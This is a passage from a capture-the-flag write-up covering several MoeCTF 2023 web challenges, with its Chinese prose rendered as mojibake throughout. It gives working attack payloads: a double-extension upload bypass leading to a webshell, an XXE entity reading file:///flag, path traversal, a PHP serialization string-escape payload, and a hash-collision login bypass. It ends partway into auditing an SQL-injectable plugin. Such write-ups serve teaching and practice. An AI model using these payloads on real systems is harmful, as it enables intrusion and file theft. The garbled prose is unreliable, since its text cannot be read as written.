'file_path' =&gt; $uploadFilePath])); } else { die(json_encode(['success' =&gt; false, 'message' =&gt; 'æ–‡ä»¶ä¸Šä¼ å¤±è´¥'])); } } else{ highlight_file(__FILE__); } ?&gt; è¿™é‡Œç»•è¿‡å‰ç«¯æŠ“åŒ…åï¼Œä¿®æ”¹imageç±»å‹ï¼Œæ–‡ä»¶å†…å­˜ä¸ç”¨ç®¡ï¼Œ$secondSegment = $fileNameParts[1];è¿™é‡Œå¦‚æœæˆ‘ä»¬æ–‡ä»¶æ˜¯1.phpï¼Œé‚£ä¹ˆ secondSegmentå˜é‡ä¸ºphpï¼Œå› æ­¤if($secondSegment !== 'png')æƒ³è¦æ»¡è¶³è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸º1.png.phpï¼Œä¸Šä¼ åä¾ç„¶è¢«å½“åšphpæ–‡ä»¶è§£æï¼Œè¿™æ˜¯Apacheè§£ææ¼æ´ ä¸Šä¼ åå¾—åˆ°è·¯å¾„ ![image-20230830112018057](MoeCTF 2023-wp/image-20230830112018057.png) æˆ‘ä»¬èšå‰‘è¿æ¥å³å¯ ![image-20230830112035967](MoeCTF 2023-wp/image-20230830112035967.png) ![image-20230830112059182](MoeCTF 2023-wp/image-20230830112059182.png) æ‰¾åˆ°flag äº†è§£ä½ çš„åº§é©¾ ![image-20230830113443403](MoeCTF 2023-wp/image-20230830113443403.png) æŸ¥çœ‹æºç æ‰¾åˆ°ä¸€æ®µjsä»£ç  &lt;script&gt; function submitForm(name) { var form = document.createElement(\"form\"); form.method = \"post\"; form.action = \"index.php\"; var input = document.createElement(\"input\"); input.type = \"hidden\"; input.name = \"xml_content\"; input.value = \"&lt;xml&gt;&lt;name&gt;\" + name + \"&lt;/name&gt;&lt;/xml&gt;\"; form.appendChild(input); document.body.appendChild(form); form.submit(); } &lt;/script&gt; input.value = â€œâ€ + name + â€œâ€; åœ¨è¿™ä¸ªä»£ç ç‰‡æ®µä¸­ï¼Œå°†ç”¨æˆ·æä¾›çš„ name å‚æ•°ç›´æ¥æ’å…¥åˆ° XML æ•°æ®ä¸­ï¼Œæ²¡æœ‰å¯¹å…¶è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–è½¬ä¹‰ã€‚è¿™æ„å‘³ç€å¦‚æœç”¨æˆ·æä¾›äº†åŒ…å«å¤–éƒ¨å®ä½“å¼•ç”¨çš„æ¶æ„è¾“å…¥ï¼Œé‚£ä¹ˆè¿™äº›å®ä½“å¼•ç”¨å¯èƒ½ä¼šè¢«è§£æï¼Œä»è€Œè§¦å‘ XXE æ¼æ´ã€‚ é‚£æˆ‘ä»¬ç‚¹å‡»ä¸€è¾†è½¦å¹¶bpæŠ“åŒ… payloadå¦‚ä¸‹ï¼š &lt;!DOCTYPE test [ &lt;!ENTITY poc SYSTEM \"file:///flag\"&gt; ]&gt; &lt;xml&gt;&lt;name&gt;&amp;poc;&lt;/name&gt;&lt;/xml&gt; è®°å¾—urlç¼–ç ä¸€ä¸‹ ![image-20230830114456692](MoeCTF 2023-wp/image-20230830114456692.png) ![image-20230830114449681](MoeCTF 2023-wp/image-20230830114449681-1693367090019-5.png) å¾—åˆ°flag å¤§æµ·æé’ˆ ![image-20230830114912903](MoeCTF 2023-wp/image-20230830114912903.png) çœ‹åˆ°æç¤ºé‚£æˆ‘ä»¬æŠ“åŒ…çˆ†ç ´ä¸€ä¸‹idçœ‹çœ‹ ![image-20230830114933322](MoeCTF 2023-wp/image-20230830114933322.png) ![image-20230830115522971](MoeCTF 2023-wp/image-20230830115522971.png) æ‰¾åˆ°id=341ï¼Œæ‹¿åˆ°flag moeå›¾åºŠ ![image-20230930195136880](MoeCTF 2023-wp/image-20230930195136880.png) å½“æ—¶åšè¿™ä¸ªé¢˜ä»¥ä¸ºå°±æ˜¯è¿˜æ˜¯å•çº¯çš„å›¾ç‰‡ç»•è¿‡ä¸Šä¼ å³å¯ï¼Œç„¶åå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™é‡Œæ˜¯æ£€æµ‹ä¸Šä¼ çš„æ–‡ä»¶çš„ æ–‡ä»¶å¤´å†…å®¹æ˜¯å¦ä¸ºå…¶è§„å®šçš„å›¾ç‰‡å¼€å¤´ï¼Œè¿™é‡Œæˆ‘ç›´æ¥åœ¨å‰é¢æ·»åŠ äº†gifå¤´ä¾¿æˆåŠŸä¸Šä¼ äº†ã€‚ ![image-20230930195923289](MoeCTF 2023-wp/image-20230930195923289.png) ç„¶åå°±æ˜¯æ¼«é•¿çš„èšå‰‘è¿æ¥å°è¯•äº†ï¼Œä½†å§‹ç»ˆæœªæœï¼Œç„¶åè‚¯å®šå°±æ˜¯è·¯å¾„çš„é”™è¯¯å˜›ï¼Œæˆ‘ä»¥ä¸ºæ˜¯æˆ‘ä¸ä¼šæ‰¾ä¸Šä¼ è·¯å¾„æ‰€ä»¥æ”¾å¼ƒäº†ï¼Œä½†æ˜¯çœ‹äº†wpå‘ç°å…¶å°è¯•äº†è·¯å¾„éå†ï¼Œè¿™æˆ‘ä¹Ÿæ˜¯æ²¡æƒ³åˆ°ï¼ˆå¤ªèœäº†â”­â”®ï¹â”­â”®ï¼‰é‚£æˆ‘ä»¬å€Ÿæ­¤æ€è·¯å°è¯•ä¸€ä¸‹ ![image-20230930200537482](MoeCTF 2023-wp/image-20230930200537482.png) å¦‚å›¾è®¿é—®åï¼Œè™½ç„¶é¡µé¢æ²¡å˜åŒ–ï¼ˆä½†ä¸çŸ¥é“åŸå› ï¼‰ä½†æˆ‘ä»¬å¯ä»¥ä¸‹è½½çœ‹ä¸€ä¸‹ï¼Œç”¨notepadæ‰“å¼€![image-20230930200604713](MoeCTF 2023-wp/image-20230930200604713.png) æˆåŠŸè¯»å–åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œé‚£æ„å‘³ç€è¿™é‡Œå¯ä»¥éå†å‡ºæ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œè¿™é‡Œä¸é‡è¦çš„å°±ä¸å±•ç¤ºäº†ï¼Œæ‰‹åŠ¨è¾“å…¥äº†å‡ æ¬¡ä¹‹åæˆåŠŸæ‰¾åˆ°flagï¼Œç›®å½•åœ¨â€¦/â€¦/â€¦/flagï¼Œè®¿é—®ä¸‹è½½å³å¯ ![image-20230930201640676](MoeCTF 2023-wp/image-20230930201640676.png) è¿™é‡Œè®¿é—®æç¤ºçš„phpæ–‡ä»¶ï¼Œè¿™é‡Œè®¿é—®åç®€å•çš„PHPç‰¹æ€§ï¼Œæ•°ç»„ç»•è¿‡å³å¯ ![image-20230930201841093](MoeCTF 2023-wp/image-20230930201841093.png) ![image-20230930201939081](MoeCTF 2023-wp/image-20230930201939081.png) æ‰¾åˆ°flag å¤ºå‘½åä¸‰æª ç›´æ¥å®¡è®¡ä»£ç  &lt;?php highlight_file(__FILE__); require_once('Hanxin.exe.php'); $Chant = isset($_GET['chant']) ? $_GET['chant'] : 'å¤ºå‘½åä¸‰æª';//åˆ¤æ–­chantå‚æ•°æ˜¯å¦å­˜åœ¨ $new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);//newä¸€ä¸ªç±»å¯¹è±¡ $before = serialize($new_visitor);//åºåˆ—åŒ– $after = Deadly_Thirteen_Spears::Make_a_Move($before); echo 'Your Movements: ' . $after . '&lt;br&gt;'; try{ echo unserialize($after);//ååºåˆ—åŒ– }catch (Exception $e) { echo \"Even Caused A Glitch...\"; } ?&gt; Your Movements: O:34:\"Omg_It_Is_So_Cool_Bring_Me_My_Flag\":2:{s:5:\"Chant\";s:15:\"å¤ºå‘½åä¸‰æª\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} Far away from COOL... é‚£æˆ‘ä»¬å°±åªèƒ½çœ‹ä¸€ä¸‹Hanxin.exe.phpæ–‡ä»¶ &lt;?php if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) { highlight_file(__FILE__); } class Deadly_Thirteen_Spears{ private static $Top_Secret_Long_Spear_Techniques_Manual = array( \"di_yi_qiang\" =&gt; \"Lovesickness\", \"di_er_qiang\" =&gt; \"Heartbreak\", \"di_san_qiang\" =&gt; \"Blind_Dragon\", \"di_si_qiang\" =&gt; \"Romantic_charm\", \"di_wu_qiang\" =&gt; \"Peerless\", \"di_liu_qiang\" =&gt; \"White_Dragon\", \"di_qi_qiang\" =&gt; \"Penetrating_Gaze\", \"di_ba_qiang\" =&gt; \"Kunpeng\", \"di_jiu_qiang\" =&gt; \"Night_Parade_of_a_Hundred_Ghosts\", \"di_shi_qiang\" =&gt; \"Overlord\", \"di_shi_yi_qiang\" =&gt; \"Letting_Go\", \"di_shi_er_qiang\" =&gt; \"Decisive_Victory\", \"di_shi_san_qiang\" =&gt; \"Unrepentant_Lethality\" ); public static function Make_a_Move($move){ foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement){ $move = str_replace($index, $movement, $move); //è¿™é‡Œå®¹æ˜“æƒ³åˆ°å­—ç¬¦ä¸²é€ƒé€¸ } return $move; } } class Omg_It_Is_So_Cool_Bring_Me_My_Flag{ public $Chant = ''; public $Spear_Owner = 'Nobody';//è¿™é‡Œè‚¯å®šæƒ³è¦ä¿®æ”¹ä¸ºMaoLei function __construct($chant){ $this-&gt;Chant = $chant; $this-&gt;Spear_Owner = 'Nobody'; } function __toString(){ if($this-&gt;Spear_Owner !== 'MaoLei'){//è¿™é‡Œç»™å…¶æ”¹ä¸€ä¸‹èµ‹å€¼å³å¯ return 'Far away from COOL...'; } else{ return \"Omg You're So COOOOOL!!! \" . getenv('FLAG'); } } } ?&gt; å¾ˆæ˜æ˜¾å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº†ï¼Œçœ‹ä¸€ä¸‹é¡µé¢è¾“å‡ºçš„å†…å®¹ Your Movements: O:34:\"Omg_It_Is_So_Cool_Bring_Me_My_Flag\":2:{s:5:\"Chant\";s:15:\"å¤ºå‘½åä¸‰æª\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} é‚£æˆ‘ä»¬ç›´æ¥åœ¨æ­¤åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸Šä¿®æ”¹å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯æƒ³è¦Spear_Ownerä¸ºMaoleiï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹\";s:11:\"Spear_Owner\";s:6:\"Nobody\";} å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶æˆåŠŸåˆå¹¶åˆ°å­—ç¬¦ä¸²ä¸Šï¼Œé‚£å°±è¦å°†;s:11:\"Spear_Owner\";s:6:\"Nobody\";}ç»™æŒ¤å‡ºå»ï¼Œæ•…æ­¤æˆ‘ä»¬é€‰ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢åæ•°é‡å¢åŠ çš„ï¼Œä¹Ÿå°±æ˜¯\"di_qi_qiang\" =&gt; \"Penetrating_Gaze\",æ³¨æ„è¿™é‡Œ\";s:11:\"Spear_Owner\";s:6:\"Nobody\";}ä¸º35ä¸ªï¼Œé‚£æˆ‘ä»¬è¦è¾“å…¥di_qi_qiangä¸ƒä¸ªï¼Œé‚£ä¹ˆæœ€åä¼šå¤šå‡º35ä¸ªå°†ä¸Šåˆ—å­—ç¬¦ä¸²æŒ¤å‡ºå» æœ€ç»ˆpayloadä¸ºï¼š ?chant=Penetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_Gaze\";s:11:\"Spear_Owner\";s:6:\"Maolei\";} signin å¦‚å›¾éšä¾¿è¾“å…¥äº†å‡ ä¸ªç»„åˆï¼Œç‚¹å‡»loginæ²¡ååº”ï¼Œè¿™æ—¶å€™å°±å¾—æŠ“åŒ…äº†ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆçœ‹ä¸€ä¸‹æºä»£ç  ![image-20230930203609332](MoeCTF 2023-wp/image-20230930203609332.png) ![image-20230930203746167](MoeCTF 2023-wp/image-20230930203746167.png) å½“åˆçœ‹åˆ°ä¸Šå›¾çš„ç¬¬ä¸€çœ¼ä»¥ä¸ºæ˜¯jsæ··æ·†ï¼Œç„¶åæ‰¾äº†è¯¸å¤šä¸ªç½‘ç«™æ²¡å•¥ç”¨ï¼Œç„¶åæƒ³åˆ°ä»¥å‰çš„æ—¶å€™é‡åˆ°è¿‡ç±»ä¼¼çš„ï¼Œé€‰æ‹©ç›´æ¥æ§åˆ¶å°runä¸€ä¸‹ï¼Œä¹Ÿæ˜¯æŠ¥é”™ï¼Œä¹‹åå°±æ²¡æ€è·¯æ”¾å¼ƒäº†ï¼Œç°åœ¨é‡æ–°çœ‹äº†ä¸‹ï¼ŒæŠ“åŒ…å‘ç°äº†å¦‚ä¸‹ ![image-20230930210225064](MoeCTF 2023-wp/image-20230930210225064.png) è¿™é‡Œparamsï¼Œbase64è§£å¯†5æ¬¡å¾—åˆ° ![image-20230930210247019](MoeCTF 2023-wp/image-20230930210247019.png) è¿™é‡Œæˆ‘å°±å¤§æ¦‚æƒ³çš„å°±æ˜¯è¶Šæƒäº†ï¼Œè¿™é‡Œå†çœ‹ä¸€ä¸‹é¢˜ç›®ç»™çš„é™„ä»¶ from secrets import users, salt import hashlib import base64 import json import http.server with open(\"flag.txt\",\"r\") as f: FLAG = f.read().strip() def gethash(*items): #é¡¾åæ€ä¹‰ä¸ºå¾—åˆ°hashå€¼ï¼Œä¸è¿‡è¿™é‡Œæ˜¯è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ã€‚ c = 0 for item in items: if item is None: continue c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough? return hex(c)[2:] # ç¡®ä¿\"admin\"åœ¨ç”¨æˆ·åˆ—è¡¨ä¸­ï¼Œå¹¶ä¸”å…¶å¯†ç æ˜¯\"admin\"ï¼Œå…¶ä¸­users[\"admin\"]ä»£è¡¨çš„å°±æ˜¯adminç”¨æˆ·çš„å¯†ç ï¼Œè¿™æ˜¯usersåº“çš„ç”¨æ³• assert \"admin\" in users assert users[\"admin\"] == \"admin\" # å¯¹ç”¨æˆ·åˆ—è¡¨ä¸­çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œå¾—åˆ°å“ˆå¸Œåçš„ç”¨æˆ·åˆ—è¡¨ï¼Œå…¶ä¸­é”®æ˜¯userså­—å…¸ä¸­çš„é”®ï¼Œè€Œå€¼æ˜¯è°ƒç”¨gethashå‡½æ•°è®¡ç®—å¾—åˆ°çš„å“ˆå¸Œå€¼ã€‚ hashed_users = dict((k,gethash(k,v)) for k,v in users.items()) eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,\"big\",signed=True).decode().translate({ord(c):None for c in \"\\x00\"})) # what is it? def decrypt(data:str): for x in range(5): data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely? //è¿™é‡Œæç¤ºbase64åŠ å¯†äº†äº”æ¬¡ return data __page__ = base64.b64encode(\"PCFET0NUW....\")#è¿™é‡Œæ˜¯è®¿é—®é¦–é¡µçš„å‰ç«¯ä»£ç ï¼Œè¿™é‡Œå°±çœç•¥äº† class MyHandler(http.server.BaseHTTPRequestHandler):#è¯¥å‡½æ•°èµ·çš„ä½œç”¨ä¸ºå¯¹è®¿é—®è€…çš„è®¿é—®urlåœ°å€åšå‡ºååº” def do_GET(self): try: if self.path == \"/\": self.send_response(200) self.end_headers() self.wfile.write(__page__) else: self.send_response(404) #è¿™é‡Œçœ‹åˆ°åªæœ‰è®¿é—®/ä¹Ÿå°±æ˜¯é¦–é¡µæ‰ä¼šæ­£å¸¸ï¼Œå¦åˆ™å…¶ä»–éƒ½å›æ˜¾404 self.end_headers() self.wfile.write(b\"404 Not Found\") except Exception as e: print(e) self.send_response(500) self.end_headers() self.wfile.write(b\"500 Internal Server Error\") def do_POST(self): try: if self.path == \"/login\": body = self.rfile.read(int(self.headers.get(\"Content-Length\"))) payload = json.loads(body) #è®¾ç½®jsonæ•°æ® params = json.loads(decrypt(payload[\"params\"]))#èµ‹å€¼ç»™params print(params)#ä»¥ä¸‹æ˜¯å¯¹æ•°æ®ä¸­çš„é”®å€¼çš„åˆ¤æ–­ if params.get(\"username\") == \"admin\": self.send_response(403) self.end_headers() self.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\") print(\"admin\") return if params.get(\"username\") == params.get(\"password\"): self.send_response(403) self.end_headers() self.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\") print(\"same\") return hashed = gethash(params.get(\"username\"),params.get(\"password\")) for k,v in hashed_users.items(): #å¦‚æœè®¡ç®—å‡ºçš„hashå€¼ä¸é¢„å…ˆè®¡ç®—çš„ä¸€è‡´ï¼Œåˆ™è¾“å‡ºflag if hashed == v: data = { \"user\":k, \"hash\":hashed, \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\" } self.send_response(200) self.end_headers() self.wfile.write(json.dumps(data).encode()) print(\"success\") return self.send_response(403) self.end_headers() self.wfile.write(b\"Invalid username or password\") else: self.send_response(404) self.end_headers() self.wfile.write(b\"404 Not Found\") except Exception as e: print(e) self.send_response(500) self.end_headers() self.wfile.write(b\"500 Internal Server Error\") if __name__ == \"__main__\": server = http.server.HTTPServer((\"\", 9999), MyHandler) server.serve_forever() ![image-20230930211342269](MoeCTF 2023-wp/image-20230930211342269.png) è¿™é‡Œä»£ç å®¡è®¡å®¡çš„æˆ‘æœ‰ç‚¹å¤´ç–¼ï¼Œå› æ­¤å€Ÿé‰´ä¸€ä¸‹è¿™ä½ä½¬çš„å®¡è®¡æ€è·¯ åœ¨do_POSTæ–¹æ³•ä¸­ï¼Œä»£ç æ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œï¼š ä»HTTPè¯·æ±‚ä¸­è·å–åŒ…å«ç”¨æˆ·åå’Œå¯†ç çš„JSONæ•°æ®ã€‚ è§£å¯†JSONæ•°æ®ï¼Œç„¶åè·å–ç”¨æˆ·åå’Œå¯†ç ã€‚ ä½¿ç”¨gethashå‡½æ•°å¯¹æä¾›çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œå“ˆå¸Œã€‚ å°†è®¡ç®—å‡ºçš„å“ˆå¸Œä¸é¢„å…ˆè®¡ç®—çš„ç”¨æˆ·å“ˆå¸Œè¿›è¡Œæ¯”è¾ƒï¼Œä»¥æŸ¥çœ‹æ˜¯å¦åŒ¹é…ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ ¹æ®ä¸‹è¿°ä»£ç ï¼Œç”¨æˆ·åå’Œå¯†ç å‡ä¸ºadminï¼ˆä½†è¿™ä¸¤è¡Œä»£ç åªæ˜¯é’ˆå¯¹usersåº“çš„æ£€æŸ¥ï¼Œå¹¶ä¸å¯¹ç”¨æˆ·çš„è¾“å…¥æœ‰ä½•ä½œç”¨ï¼‰ assert \"admin\" in users assert users[\"admin\"] == \"admin\" ä¹Ÿå°±æ˜¯åªæœ‰å½“hashedçš„ç»“æœä¸ºgethash(\"admin\", \"admin\")çš„æ—¶å€™ï¼Œæ‰èƒ½æ‹¿åˆ°flag # è®¡ç®—ç”¨æˆ·åå’Œå¯†ç çš„å“ˆå¸Œå€¼ hashed = gethash(params.get(\"username\"), params.get(\"password\")) # éå†é¢„å…ˆè®¡ç®—çš„ç”¨æˆ·å“ˆå¸Œå€¼ for k, v in hashed_users.items(): # å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å“ˆå¸Œå€¼ï¼Œè¿”å›ç”¨æˆ·ä¿¡æ¯ if hashed == v: data = { \"user\": k, \"hash\": hashed, \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\" } self.send_response(200) self.end_headers() self.wfile.write(json.dumps(data).encode()) print(\"success\") return åˆ°æ­¤æ€»ç»“ä¸€ä¸‹æ€è·¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨å‰ç«¯ç™»é™†çš„æ—¶å€™ä¸èƒ½ä»¥admin:adminç™»å½•ï¼Œè¿™æ ·ä¼šæ˜¾ç¤ºæ— æƒè®¿é—®ï¼Œè€Œçœ‹éªŒè¯ä»£ç å‘ç°usersåº“ä¸­å·²ç»å«æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼šadminï¼Œadminï¼Œå¹¶ç”¨gethashè®¡ç®—å‡ºäº†å„è‡ªçš„hashå€¼å­˜å‚¨åœ¨hashed_usersè¿™ä¸€å­—å…¸ä¸­ï¼Œéšåä»£ç è¦æ±‚æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç åœ¨åˆ†åˆ«è¢«è®¡ç®—å‡ºhashå€¼çš„æ—¶å€™ï¼Œä¸hashed_userså­—å…¸ä¸­å­˜å‚¨çš„æŸä¸€ç»„æ•°æ®ç›¸ç­‰æ‰ä¼šå›æ˜¾flagã€‚ä¹Ÿå°±æ˜¯è¯´åªæœ‰æˆ‘ä»¬gethash(â€œadminâ€ï¼Œâ€œadminâ€)çš„æ—¶å€™æ‰èƒ½æ‹¿åˆ°flagï¼Œä½†å¾ˆæ˜¾ç„¶æˆ‘ä»¬æ— æ³•ä»¥adminèº«ä»½ç™»å½•ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦å…³æ³¨gethashå‡½æ•°çš„è¿”å›å€¼æ˜¯å¦ç›¸ç­‰å³å¯ï¼Œé‚£æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ã€‚ import hashlib import base64 import json import http.server salt = 0 def gethash(*items): c = 0 for item in items: if item is None: continue c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough? return hex(c)[2:] print(gethash('admin','admin')) ![image-20231001090719387](MoeCTF 2023-wp/image-20231001090719387.png) å¯ä»¥çœ‹åˆ°è¿”å›å€¼ä¸º0ï¼Œå› æ­¤åªè¦æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç åœ¨gethashä½œç”¨ä¸‹è¿”å›å€¼ä¸º0å³å¯ç»•è¿‡ï¼Œä¸‹é¢æ˜¯å¯¹ gethashå‡½æ•°çš„åˆ†æï¼ˆå€Ÿé‰´å¤§ä½¬ï¼‰ è¿™ä¸ªå‡½æ•°æ¥å—ç”¨æˆ·åå’Œå¯†ç çš„valueä½œä¸ºå‚æ•°ï¼Œç„¶åè®¡ç®—å®ƒä»¬çš„å“ˆå¸Œå€¼ï¼Œé€»è¾‘å¦‚ä¸‹ï¼š 1. ä½¿ç”¨hashlib.md5è®¡ç®—é¡¹ç›®çš„MD5å“ˆå¸Œå€¼ã€‚ 2. å°†é¡¹ç›®åŒ…è£…åœ¨æ–¹æ‹¬å·ä¸­ï¼Œå¹¶ä¸ä¸€ä¸ªåä¸ºsaltçš„å€¼è¿æ¥ï¼Œç„¶åç¼–ç ä¸ºå­—èŠ‚ä¸²ã€‚ 3. å°†æ­¥éª¤2ä¸­çš„å­—èŠ‚ä¸²çš„MD5å“ˆå¸Œå€¼è½¬æ¢ä¸ºæ•´æ•°ã€‚ 4. ä½¿ç”¨å¼‚æˆ–è¿ç®— (^) å°†æ¯ä¸ªé¡¹ç›®çš„å“ˆå¸Œå€¼ç»„åˆåœ¨ä¸€èµ·ã€‚ 5. å°†æœ€ç»ˆçš„ç»„åˆå“ˆå¸Œå€¼è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²å¹¶è¿”å›ã€‚ è¿™æ®µä»£ç çš„å®‰å…¨æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡å‘é€{\"username\":null,\"password\":null}æ¥ç»•è¿‡èº«ä»½éªŒè¯ã€‚ ä¸»è¦é—®é¢˜åœ¨äºï¼Œgethashå‡½æ•°ä¼šè¿è¡ŒNoneçš„è¾“å…¥ï¼Œå®ƒæ²¡æœ‰æ£€æŸ¥è¾“å…¥æ˜¯å¦ä¸ºNoneï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨å®ƒä»¬ã€‚ åœ¨Pythonä¸­ï¼Œå°†Noneä¼ é€’ç»™int(None)ä¼šå°†å…¶è½¬æ¢ä¸º0ã€‚ æ‰€ä»¥ï¼Œå¦‚æœæä¾›çš„ç”¨æˆ·åå’Œå¯†ç éƒ½ä¸ºNoneï¼Œgethashå‡½æ•°å°†è®¡ç®—å‡ºç›¸åŒçš„å“ˆå¸Œå€¼ï¼Œå³0ã€‚ å‡è®¾æ”»å‡»è€…å‘é€ä»¥ä¸‹JSONæ•°æ®ï¼š {\"username\": null, \"password\": null} ç†è®ºä¸Šæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä½†æ˜¯ä»£ç ä¸­æœ‰ä¸€å¤„è§„å®šusernameä¸èƒ½ç­‰äºpasswordï¼Œäºæ˜¯è¿™ä½ä½¬æ„é€ å¦‚ä¸‹payloadï¼ˆé’ˆå¯¹ä»£ç ç‰¹æ€§ï¼‰ {\"username\":\"0\", \"password\": 0} è¿™é‡Œåˆ©ç”¨çš„æ˜¯pythonèº«ä¸ºå¼ºç±»å‹è¯­è¨€ï¼Œä¼šè®¤ä¸ºä¸Šè¿°ç”¨æˆ·åå’Œå¯†ç ä¸ç›¸ç­‰ä»è€Œç»•è¿‡ï¼Œå¦‚æ­¤æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ ![image-20231001091434902](MoeCTF 2023-wp/image-20231001091434902.png) å‘ç°ä¾æ—§ä¸º0ï¼Œé‚£æ˜¾è€Œæ˜“è§ç›´æ¥postä¼ å…¥ä¸Šè¿°ä»£ç å³å¯ï¼Œä½†è¦base64äº”æ¬¡åŠ å¯† {\"params\":\"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVIaFZWbVJ6VkZaRmQxSnVRbHBOUjFKSVdsY3hUbVZzY0VsWGJYQnBWbXRhZDFaRVNuTlJiVkY1VjJ4S1VWWkVRVGs9\"} ![image-20231001091702139](MoeCTF 2023-wp/image-20231001091702139.png) æ‹¿åˆ°flag å‡ºå»æ—…æ¸¸çš„å¿ƒæµ· ![image-20230831103708841](MoeCTF 2023-wp/image-20230831103708841.png) æ‰“å¼€é¦–é¡µï¼Œéšä¾¿ç‚¹å‡»äº†å‡ ä¸‹æ²¡å‘ç°ä¸œè¥¿ï¼Œé‚£çœ‹ä¸€ä¸‹æºä»£ç  ![image-20230831103913918](MoeCTF 2023-wp/image-20230831103913918.png) å‘ç°å¯ç–‘å¤„ï¼Œè¿™é‡Œæ˜¾ç¤ºäº†ä¸€ä¸ªurlåœ°å€ï¼Œæˆ‘ä»¬æ‹¼æ¥è®¿é—®ä¸€ä¸‹çœ‹çœ‹ &lt;?php /* Plugin Name: Visitor auto recorder Description: Automatically record visitor's identification, still in development, do not use in industry environment! Author: KoKoMi Still in development! :) */ // ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼ highlight_file(__FILE__); // åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„ require_once('/var/www/html/wordpress/' . 'wp-config.php'); $db_user = DB_USER; // æ•°æ®åº“ç”¨æˆ·å $db_password = DB_PASSWORD; // æ•°æ®åº“å¯†ç  $db_name = DB_NAME; // æ•°æ®åº“åç§° $db_host = DB_HOST; // æ•°æ®åº“ä¸»æœº // æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹ // è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç  $ip = $_POST['ip']; $user_agent = $_POST['user_agent']; $time = stripslashes($_POST['time']); $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name); // æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ if ($mysqli-&gt;connect_errno) { echo 'æ•°æ®åº“è¿æ¥å¤±è´¥: ' . $mysqli-&gt;connect_error; exit(); } $query = \"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)\"; // æ‰§è¡Œæ’å…¥ $result = mysqli_query($mysqli, $query); // æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ if ($result) { echo 'æ•°æ®æ’å…¥æˆåŠŸ'; } else { echo 'æ•°æ®æ’å…¥å¤±è´¥: ' . mysqli_error($mysqli); } // å…³é—­æ•°æ®åº“è¿æ¥ mysqli_close($mysqli); //gptçœŸå¥½ç”¨ å¾ˆå¥½ï¼Œçœ‹åˆ°äº†æºä»£ç ï¼Œé‚£æˆ‘ä»¬å®¡ä¸€ä¸‹ï¼Œè¿™é‡Œä»£ç æ„æ€æ˜¯æ¥å—ä¸‰ä¸ªpostä¼ å‚ï¼Œéšåè¿æ¥æ•°æ®åº“ï¼Œç„¶åå°†è¿™å‡ 